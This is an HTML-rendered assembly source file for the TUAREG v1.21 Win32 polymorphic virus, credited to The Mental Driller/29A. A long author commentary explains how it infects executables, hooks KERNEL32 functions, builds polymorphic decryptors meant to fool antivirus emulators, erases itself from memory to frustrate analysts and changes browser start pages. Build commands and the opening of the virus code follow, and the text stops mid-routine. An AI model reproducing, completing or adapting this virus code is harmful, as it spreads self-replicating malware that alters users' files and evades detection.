<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>tuareg.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;;ﬂﬂ€ﬂﬂﬂ € €ﬂﬂ€ €ﬂ€‹ €ﬂﬂﬂ €ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">;;ﬁ € €  € €  € € ‹€ €    € ƒƒƒƒƒƒƒƒƒ Designed to carry the ƒƒƒƒƒ › ﬁ ‹› ﬁﬂ›‹›</span><span class="sc0">
</span><span class="sc1">;;ﬁ € €  € €ﬂﬂ€ €ﬂ€‹ €ﬂﬂ  € ﬂ€ ƒƒƒ TUAREG polymorphing engine ƒƒƒ ﬁ ›  ›  ‹› ›</span><span class="sc0">
</span><span class="sc1">;;ﬁ € €‹‹€ €  € €  € €‹‹‹ €‹‹€ ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ €   ›‹ﬁ‹‹ ›</span><span class="sc0">
</span><span class="sc1">;;ﬁ €‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">
</span><span class="sc1">;;ﬁ</span><span class="sc0">
</span><span class="sc1">;;ﬁ›     ﬂﬂ€ﬂﬂ      €€ ﬁ€      €‹‹  ›  ﬁ€ﬂ›    ﬁ ›          €  ﬁﬂﬂ› ﬁﬂﬂ€ ﬁﬂﬂ›</span><span class="sc0">
</span><span class="sc1">;;ﬁ›       €ﬁ       €ﬁ ›€      ﬁ›   ›  ﬁ› ﬁ›  ﬂﬁ ›         ﬁ›  €  € €  ﬁ €  €</span><span class="sc0">
</span><span class="sc1">;;ﬁﬂ›› ›   ›ﬁﬂ€ﬁ€›  › € ›ﬁ€›€ﬂ€ﬁ ﬂﬂ››  ﬁ  ﬁ €ﬂﬁﬁ ›ﬁ€›ﬁ€ﬂ   €     ﬁ   ﬂﬂ€ €ﬂﬂ€</span><span class="sc0">
</span><span class="sc1">;;ﬁ‹›€‹›   ›ﬁ ﬁﬁ‹‹  ›   ›ﬁ‹‹ﬁ ﬁﬁ €€›€  ﬁ‹‹› › ﬁﬁ›€ﬁ‹‹ﬁ    ﬁ›   ‹€€‹‹ ‹‹€ﬁ›  ﬁ›</span><span class="sc0">
</span><span class="sc1">;;ƒƒƒƒƒ›ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;;   ﬂﬂ</span><span class="sc0">
</span><span class="sc1">;; This virus is designed to carry the Tameless Unpredictable Anarchic Relent-</span><span class="sc0">
</span><span class="sc1">;; less Encryption Generator (TUAREG), so I decided to name the virus as the</span><span class="sc0">
</span><span class="sc1">;; engine. Apart from generating extremely polymorphic samples, the virus does</span><span class="sc0">
</span><span class="sc1">;; other things apart from carrying the engine.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; This is the version 1.21. The version 1.0 was sent to AVers before the re-</span><span class="sc0">
</span><span class="sc1">;; lease of this version in 29A#5, so I have had time to improve some things,</span><span class="sc0">
</span><span class="sc1">;; correct some bugs and make new features, like more complex garbage on de-</span><span class="sc0">
</span><span class="sc1">;; cryptors, the routine for zeroing the memory before terminate the program,</span><span class="sc0">
</span><span class="sc1">;; etc. The version 1.1 was sent too, but too late I realized of a "bug" in</span><span class="sc0">
</span><span class="sc1">;; the infection procedure (but NOT in the TUAREG) that made some programs to</span><span class="sc0">
</span><span class="sc1">;; refuse execution, so I corrected some lines of code, added some others, im-</span><span class="sc0">
</span><span class="sc1">;; proved the TUAREG engine greatly (now it's v1.01) and I call from all that</span><span class="sc0">
</span><span class="sc1">;; I got "TUAREG v1.21".</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; In this version:</span><span class="sc0">
</span><span class="sc1">;;               Virus total binary size: 20994 bytes</span><span class="sc0">
</span><span class="sc1">;;   Infection virtual and physical size: 65536 bytes</span><span class="sc0">
</span><span class="sc1">;;                 Binary size of TUAREG: 12951 bytes (only main engine)</span><span class="sc0">
</span><span class="sc1">;; Average size of a generated decryptor: 9.26 Kb</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Technical notes:</span><span class="sc0">
</span><span class="sc1">;;------------------</span><span class="sc0">
</span><span class="sc1">;;  - It infects all *.EXEs, *.SRCs and *.CPLs on current, windows and</span><span class="sc0">
</span><span class="sc1">;;   windows\system directories, and the programs set for execution at</span><span class="sc0">
</span><span class="sc1">;;   windows startup.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - It's also a per-process resident, patching the next functions:</span><span class="sc0">
</span><span class="sc1">;;   GetProcAddress, CreateFileA, CreateProcessA, FindFirstFileA,</span><span class="sc0">
</span><span class="sc1">;;   FindNextFileA, GetFileAttributesA, SetFileAttributesA, GetFullPathNameA,</span><span class="sc0">
</span><span class="sc1">;;   MoveFileA, CopyFileA, DeleteFileA, WinExec, _lopen, MoveFileExA and</span><span class="sc0">
</span><span class="sc1">;;   OpenFile. ExitProcess is also patched, but for special actions.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - The RVAs of the functions are obtained scanning the export directory</span><span class="sc0">
</span><span class="sc1">;;   of KERNEL32, doing a checksum of the name of every function and compa-</span><span class="sc0">
</span><span class="sc1">;;   ring it with the stored checksums on the virus. When someone coincides,</span><span class="sc0">
</span><span class="sc1">;;   then the corresponding RVA is set on the virus' calling address.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - On infection, it'll place the generated decryptors on .text section,</span><span class="sc0">
</span><span class="sc1">;;   and the .reloc section will be anulated, renamed and overwritten with</span><span class="sc0">
</span><span class="sc1">;;   the encrypted data and the overwritten code of .text. If it's not big</span><span class="sc0">
</span><span class="sc1">;;   enough, its size will be increased until all the stuff fit in it. If</span><span class="sc0">
</span><span class="sc1">;;   there isn't any .reloc section, then a new section with a random name</span><span class="sc0">
</span><span class="sc1">;;   will be added (if there is enough space in the EXE header).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - Then, the infection mark will be: if there's a .reloc section, the</span><span class="sc0">
</span><span class="sc1">;;   file isn't infected, and neither if the .rsrc section is the last. If</span><span class="sc0">
</span><span class="sc1">;;   .rsrc section isn't the last section of all, the file won't be infected,</span><span class="sc0">
</span><span class="sc1">;;   since it could be already. I know it isn't the best system, but I was</span><span class="sc0">
</span><span class="sc1">;;   tired of coding :). In the future I'll do a less noticeable infection.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - The virus is polymorphic, using the TUAREG. Moreover, a little also</span><span class="sc0">
</span><span class="sc1">;;   polymorphic decryptor (to avoid cryptanalisis) has been put. It's not as</span><span class="sc0">
</span><span class="sc1">;;   polymorphic as TUAREG generated ones (well, compared to the TUAREG gene-</span><span class="sc0">
</span><span class="sc1">;;   rated decryptors, the little one shouldn't be called "a decryptor" :),</span><span class="sc0">
</span><span class="sc1">;;   but well...</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  Notes about the TUAREG</span><span class="sc0">
</span><span class="sc1">;;--------------------------</span><span class="sc0">
</span><span class="sc1">;;  TUAREG has been a neverending project practically since I entered in the</span><span class="sc0">
</span><span class="sc1">;; viruscene. My initial releases didn't resemble in any way with the result</span><span class="sc0">
</span><span class="sc1">;; (this one), but in spite of this fact, I'm thousands of times more proud</span><span class="sc0">
</span><span class="sc1">;; of this result than ever, since I didn't expected such a complexity after</span><span class="sc0">
</span><span class="sc1">;; a so easy coding of it (well, not sooooo easy, but it was not like coding</span><span class="sc0">
</span><span class="sc1">;; the MeDriPolEn, where there were things that I didn't know what they do,</span><span class="sc0">
</span><span class="sc1">;; although they functioned well :), but I knew every moment what was expected</span><span class="sc0">
</span><span class="sc1">;; for every portion of code).</span><span class="sc0">
</span><span class="sc1">;; After correcting some little bugs (and not so little, but dark ones), I</span><span class="sc0">
</span><span class="sc1">;; got very surprised with the result. Oh, errmh... if I explain first what</span><span class="sc0">
</span><span class="sc1">;; the engine does, maybe the explanations will be easier :). So let's see:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; - The TUAREG is based in two main techniques that I explain in the article</span><span class="sc0">
</span><span class="sc1">;;  called "Advanced decryptor construction", which are PRIDE and Branching.</span><span class="sc0">
</span><span class="sc1">;;  PRIDE (Pseudo-Random Index DEcryption) avoids linear decryption, seeming</span><span class="sc0">
</span><span class="sc1">;;  a normal access of an application over its data, and Branching avoids the</span><span class="sc0">
</span><span class="sc1">;;  linear execution of a decryption loop, since it can execute sixteen types</span><span class="sc0">
</span><span class="sc1">;;  of different code that performs exactly the same action, so there isn't</span><span class="sc0">
</span><span class="sc1">;;  any manner of knowing the behaviour of the engine (which path is going</span><span class="sc0">
</span><span class="sc1">;;  to take everytime) without emulation.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; - To perform the Branching, the entire engine has been oriented to execute</span><span class="sc0">
</span><span class="sc1">;;  in nearly absolute recursivity, simplifying alot many actions, and taking</span><span class="sc0">
</span><span class="sc1">;;  advance of this to create very structured portions of code that could be</span><span class="sc0">
</span><span class="sc1">;;  on any program. Not in vane, the size of the decryptors overpasses 8 Kb of</span><span class="sc0">
</span><span class="sc1">;;  pure code in the majority of times.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - The phylosophy of this engine is completely different from the</span><span class="sc0">
</span><span class="sc1">;;  MeDriPolEn. Since I based that one on simulate a corrupted file, this time</span><span class="sc0">
</span><span class="sc1">;;  I simulate a normal application. Every branch has this "format":</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   ------*-------*-------*--------xxxxxxxxxxxxx--&lt;&gt;------() -----|----|---|</span><span class="sc0">
</span><span class="sc1">;;  Legend:</span><span class="sc0">
</span><span class="sc1">;;  -- : Garbage</span><span class="sc0">
</span><span class="sc1">;;   * : Random conditional jump to another branch</span><span class="sc0">
</span><span class="sc1">;;   x : Decryption code (mixed with garbage)</span><span class="sc0">
</span><span class="sc1">;;  &lt;&gt; : Check of end-of-decryption. If it isn't, it performs a random jump</span><span class="sc0">
</span><span class="sc1">;;      to any * on any branch</span><span class="sc0">
</span><span class="sc1">;;  () : Code to jump to the decrypted part, and the code of this branch ends.</span><span class="sc0">
</span><span class="sc1">;;  ----| : Subroutines that are created while coding this branch. The addres-</span><span class="sc0">
</span><span class="sc1">;;         ses of that subroutines are stored into an array which allows to</span><span class="sc0">
</span><span class="sc1">;;         other branches to do calls to that subroutines apart from their own</span><span class="sc0">
</span><span class="sc1">;;         ones.</span><span class="sc0">
</span><span class="sc1">;;  This type of code is repeated several times and it's randomized alot.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - The garbage is quite complex to give up the less advanced emulators. The</span><span class="sc0">
</span><span class="sc1">;;   generator can do CALLs with stack entries and stack frames (emulation of</span><span class="sc0">
</span><span class="sc1">;;   this), nested CALLs, conditional jumps with non-zero displacement, memory</span><span class="sc0">
</span><span class="sc1">;;   read/writes (performed to .bss when this section exists in the infected</span><span class="sc0">
</span><span class="sc1">;;   file), 8 and 32 bit common types (some 16 bit ones are avoided on purpo-</span><span class="sc0">
</span><span class="sc1">;;   se, due to some emulators that take them as suspicious on a Win32 app.),</span><span class="sc0">
</span><span class="sc1">;;   random short loops between code, relative jump to the decrypted code (re-</span><span class="sc0">
</span><span class="sc1">;;   quires execution/emulation for a correct running of it), calls to impor-</span><span class="sc0">
</span><span class="sc1">;;   ted KERNEL32 functions (it was hard to make it!), etc. etc. etc., and I</span><span class="sc0">
</span><span class="sc1">;;   don't use any one-byte usual garbage on poly engines (those CLCs, CMCs,</span><span class="sc0">
</span><span class="sc1">;;   STIs, etc. are highly suspicious for an emulator, so I didn't put anyone</span><span class="sc0">
</span><span class="sc1">;;   of them, except on the little second decryptor, which is under the main</span><span class="sc0">
</span><span class="sc1">;;   encryption layer).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - Before entering to the TUAREG engine, the virus scans the victim's body</span><span class="sc0">
</span><span class="sc1">;;   to determine the future virtual address of the import table and the vir-</span><span class="sc0">
</span><span class="sc1">;;   tual addresses of the import table fields, and it fills the fields in the</span><span class="sc0">
</span><span class="sc1">;;   APIInfo blocks to know which address it has to use to make a calling to</span><span class="sc0">
</span><span class="sc1">;;   that KERNEL32 function. Once made, the virus will call any of the "con-</span><span class="sc0">
</span><span class="sc1">;;   trolled" APIs that were also in the import table. I think it's the first</span><span class="sc0">
</span><span class="sc1">;;   virus (November 2000) that makes API callings in the decryptor :). The</span><span class="sc0">
</span><span class="sc1">;;   called APIs are ordered in frequency of apparition in an application, and</span><span class="sc0">
</span><span class="sc1">;;   with a little algorithm we make the first ones to be selected more often</span><span class="sc0">
</span><span class="sc1">;;   than the next ones (in descendent order).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - Some other internal features that "beautifies" the code.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  More about the virus itself</span><span class="sc0">
</span><span class="sc1">;;-------------------------------</span><span class="sc0">
</span><span class="sc1">;;  - Since it's a v1.21, it was code over the version 1.0 (of course), so if</span><span class="sc0">
</span><span class="sc1">;;   some code isn't commented is because I was lazy to do it :), and many</span><span class="sc0">
</span><span class="sc1">;;   things are changed from v1.0 (bugs corrected, some things improved, etc.)</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - The KERNEL32 address is found using the address pushed onto the stack</span><span class="sc0">
</span><span class="sc1">;;   from the beginning. It's easy, it doesn't generate errors (since most</span><span class="sc0">
</span><span class="sc1">;;   Microsoft C compiled programs use the fact that that address exists),</span><span class="sc0">
</span><span class="sc1">;;   and it's compatible with all versions of Win32 (I think). Anyway, the</span><span class="sc0">
</span><span class="sc1">;;   virus uses SEH. If any exception occurs while any operation, the virus</span><span class="sc0">
</span><span class="sc1">;;   will restore the old SEH and execute the host.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - After finding the RVAs of the API functions, it performs a runtime in-</span><span class="sc0">
</span><span class="sc1">;;   fection.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - After that, the virus patches the import table of the file and set its</span><span class="sc0">
</span><span class="sc1">;;   per-process part.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - If the API functions couldn't be obtained, the virus will exit. Other-</span><span class="sc0">
</span><span class="sc1">;;   wise, if WriteProcessMemory nor GetCurrentProcess RVAs aren't obtained,</span><span class="sc0">
</span><span class="sc1">;;   it will simulate an error of execution, since it can't restore the host.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - Before returning to the host, it'll try to patch all the ocurrences of</span><span class="sc0">
</span><span class="sc1">;;   ExitProcess in the host and make them to point to the routine prepared</span><span class="sc0">
</span><span class="sc1">;;   on this virus to hold it (that's what I call "Pseudo-EPO" :). When the</span><span class="sc0">
</span><span class="sc1">;;   application calls to ExitProcess, the virus takes control, and since the</span><span class="sc0">
</span><span class="sc1">;;   program is "under the user's view" terminated, we can perform intensive</span><span class="sc0">
</span><span class="sc1">;;   virus activity, as a background action. What we do here is to infect all</span><span class="sc0">
</span><span class="sc1">;;   programs, not only one of each four, with runtime infection, and then we</span><span class="sc0">
</span><span class="sc1">;;   overwrite all the virus code with zeroes to avoid AVers to have a clean</span><span class="sc0">
</span><span class="sc1">;;   copy of the virus in memory when executing on a simulated environment and</span><span class="sc0">
</span><span class="sc1">;;   waiting for the end of running.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - In this version, the virus is very stable, and an average user won't</span><span class="sc0">
</span><span class="sc1">;;   notice the presence of the virus by errors in the system, since even the</span><span class="sc0">
</span><span class="sc1">;;   TUAREG (the most complex code I ever make) hasn't any errors now (from</span><span class="sc0">
</span><span class="sc1">;;   what I know), nor the infection system.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  Payload</span><span class="sc0">
</span><span class="sc1">;;-----------</span><span class="sc0">
</span><span class="sc1">;;  On the first and third friday of every month, the start pages on the two</span><span class="sc0">
</span><span class="sc1">;; most used navigators (Internet Explorer and Netscape Communicator) will be</span><span class="sc0">
</span><span class="sc1">;; set to http://www.thehungersite.com, which it's a web that donates food to</span><span class="sc0">
</span><span class="sc1">;; hungry countries bought with the money that they earn when you visit the</span><span class="sc0">
</span><span class="sc1">;; banners. The virus sets this using the ADVAPI32.DLL registry functions.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  With this, I could say that maybe it's the first payload in the viruses'</span><span class="sc0">
</span><span class="sc1">;; history that performs something useful and maybe changes some minds about</span><span class="sc0">
</span><span class="sc1">;; the state of our world. Hey, and you can do it too! Enter in that URL</span><span class="sc0">
</span><span class="sc1">;; (http://www.thehungersite.com) and press "Donate food". It's easy, free and</span><span class="sc0">
</span><span class="sc1">;; can save lives!</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  About this, I saw some time ago in alt.comp.virus (Usenet) a discussion</span><span class="sc0">
</span><span class="sc1">;; about this virus. A guy asked if this virus can be called a good virus or</span><span class="sc0">
</span><span class="sc1">;; what (due to the payload), and it generates a good discussion about the</span><span class="sc0">
</span><span class="sc1">;; ethicals of virus writing to make this type of things. Well, I did it be-</span><span class="sc0">
</span><span class="sc1">;; cause I wanted to make a payload that make something more than fuck the</span><span class="sc0">
</span><span class="sc1">;; user. And it's far from my intention to difamate the URL I redirect naviga-</span><span class="sc0">
</span><span class="sc1">;; tors to, but it's the most famous and most trustable donation service that</span><span class="sc0">
</span><span class="sc1">;; I saw over the internet, and moreover this page has links to other free do-</span><span class="sc0">
</span><span class="sc1">;; nation services. I don't care about that ones that think its start page is</span><span class="sc0">
</span><span class="sc1">;; "holy" and nobody must touch it (the ones that think that their own home</span><span class="sc0">
</span><span class="sc1">;; comfort is above anyone's life - get a life!), but I care about the ones</span><span class="sc0">
</span><span class="sc1">;; that think the action is good but the way is bad (a virus). My apologizes,</span><span class="sc0">
</span><span class="sc1">;; but you have to think that a virus is a piece of code, not a fragment of</span><span class="sc0">
</span><span class="sc1">;; The Apocalypse :).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; My thanks to:</span><span class="sc0">
</span><span class="sc1">;;---------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The whole 29A - members and ex-members, because it's the Dream Team of</span><span class="sc0">
</span><span class="sc1">;;  the vx!</span><span class="sc0">
</span><span class="sc1">;; All ppl who innove and create in this scene, and don't destruct the work</span><span class="sc0">
</span><span class="sc1">;;  of anyone (I HATE destructive payloads! :)</span><span class="sc0">
</span><span class="sc1">;; To you, for reading this</span><span class="sc0">

</span><span class="sc1">;; To assemble this:</span><span class="sc0">
</span><span class="sc1">;; TASM32 /m29A /ml tuareg.asm</span><span class="sc0">
</span><span class="sc1">;; TLINK32 -aa -Tpe -x tuareg.obj,,,import32.lib</span><span class="sc0">
</span><span class="sc1">;; PEWRSEC tuareg.exe</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc1">;; Message on first generation</span><span class="sc0">
</span><span class="sc5">Titulo</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Virus TUAREG v1.21 1st Generation by The Mental Driller/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Mensaje</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'You have been infected with the first generation'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'of the virus TUAREG by The Mental Driller/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">  </span><span class="sc1">; For the fake host</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">Virus_Size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_Virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Inic_Virus</span><span class="sc0">
</span><span class="sc5">Virus_SizePOW2</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10000h</span><span class="sc0">    </span><span class="sc1">; I don't think it overpasses 65536 bytes.</span><span class="sc0">
                                 </span><span class="sc1">; Since this size is virtual, I don't care</span><span class="sc0">
                                 </span><span class="sc1">; very much about this one.</span><span class="sc0">
</span><span class="sc5">Host_Data_Size</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4000h</span><span class="sc0"> </span><span class="sc1">; This one is the one to worry about! :)</span><span class="sc0">
                              </span><span class="sc1">; It's physical!</span><span class="sc0">

</span><span class="sc5">TuaregMain</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc5">Inic_Virus</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">

</span><span class="sc1">;; This decryptor will be  generated later. It's a full polymorphic one, al-</span><span class="sc0">
</span><span class="sc1">;; though very simple, to avoid cryptanalisys. The structure is as follows:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; MOV Reg,InicDecryptVirus</span><span class="sc0">
</span><span class="sc1">;; MOV Reg2,Virus_Size / 4</span><span class="sc0">
</span><span class="sc1">;; MOV Reg3,CryptKey</span><span class="sc0">
</span><span class="sc1">;; Loop:</span><span class="sc0">
</span><span class="sc1">;; XOR/ADD/SUB [Reg],Reg3</span><span class="sc0">
</span><span class="sc1">;; ADD Reg,4</span><span class="sc0">
</span><span class="sc1">;; ADD/SUB/XOR/ROL1 Reg3,Modifier</span><span class="sc0">
</span><span class="sc1">;; DEC Reg2</span><span class="sc0">
</span><span class="sc1">;; JNZ Loop</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The MOVs can be MOVs, LEAs or pairs PUSH/POP, and it can use DEC or SUB,1</span><span class="sc0">
</span><span class="sc1">;; or ADD,-1 , randomly selected. Well, quite better than v1.0 (which was a</span><span class="sc0">
</span><span class="sc1">;; fixed decryptor where I changed values).</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3Ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">InicDecryptVirus</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">           </span><span class="sc1">; Restore possible STD</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">
</span><span class="sc5">GetDeltaOffset</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetDeltaOffset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaOffset2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">  </span><span class="sc1">; This is needed!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaOffset3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaOffset4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaOffset5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0"> </span><span class="sc1">; rdtsc         ; Get CPU timestamp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set EAX (low timestamp)</span><span class="sc0">
                                                   </span><span class="sc1">; on random seed</span><span class="sc0">
         </span><span class="sc1">;; Put the return address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InicIP</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RestoreAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RestoreAddress2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfText</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfText2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImageBase</span><span class="sc4">]</span><span class="sc0">
